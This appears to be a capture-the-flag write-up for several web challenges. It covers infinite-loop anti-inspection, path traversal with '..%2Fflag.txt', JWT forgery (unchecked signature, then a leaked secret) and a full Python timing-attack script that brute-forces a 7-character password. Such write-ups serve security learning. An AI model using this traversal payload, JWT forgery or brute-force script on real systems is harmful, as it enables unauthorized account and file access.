<h1>Anti inspect </h1>
The webpage has a heavy javascript function which overloads the browser by having infinite loop
causing it to crack. Just using command-line curl to GET the webpage reveals the flag.


<h1> Traversed </h1>

Simple path traversal with url encoded request.
So `{url}/..%2Fflag.txt`

<h1>jwt-1</h1>
Use jwt.io to decode a jwt token. Change admin to true. 
The vuln is that the server is not checking if the secret matches or not.
So value of jwt secret does not matter and simply using the new token works.

<h1>jwt-2</h1>
Similar to jwt-1 but now the secret check is implemented. But in the source provided the jwt-secret is revealed. 
Use that to create verified cookie setting admin to True.

<h1>Kirbytime</h1>
Time based attack vulnerability.
There is a login form and on reading the login.py provided in source we find the password is 7 char long and is checked one char at a time.
After each correct character there is a 1 second dealy before checking the next character. So we could start bruteforcing one char at a time
sending the current correct password each time.But there is one problem, the minimum lenght of password accepted is 7 chars. So we pad the current current password 
with the required number of characters. The exploit.py is below:

```
import requests
import time

url = 'https://34.31.154.223:56366'

length = 7
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
margin = 0.2

def generate(currentPassword, position):
    TPassword = []
    for char in charset:
        testPassword = currentPassword[:position] + char + '#' * (length - position - 1)
        TPassword.append(testPassword)
    return TPassword

def TPassword(TPassword, CDelay):
    max_time = 0
    correctPassword = ''

    for password in TPassword:
        start_time = time.time()
        response = requests.post(url, data={'password': password})
        ETime = time.time() - start_time

        print(f'Testing: {password} | Time taken: {ETime:.2f} seconds')

        if ETime > max_time:
            max_time = ETime
            correctPassword = password

        if ETime > CDelay + margin:
            break

    return correctPassword, max_time

def main():
    currentPassword = '#' * length
    CDelay = 1

    for position in range(length):
        print(f'Finding character at position {position + 1}...')

        TPassword_list = generate(currentPassword, position)

        correctPassword, max_time = TPassword(TPassword_list, CDelay)
        correctChar = correctPassword[position]

        currentPassword = currentPassword[:position] + correctChar + currentPassword[position + 1:]
        print(f'Updated password: {currentPassword}')

        CDelay += 1

    print(f'Final password: {currentPassword}')

if __name__ == "__main__":
    main()

```

<h1>Scrainbrow</h1>
This was not really a Web question and more of a scripting question.Should have been in misc.
So we are given a 100x100 canvas of pixels so 10k total pixels which are jumbled. We have to swap one pixel at a time to form a required gradient.
Then the moveHistory[] is sent to server which checks if its correct and if yes returns the flag.



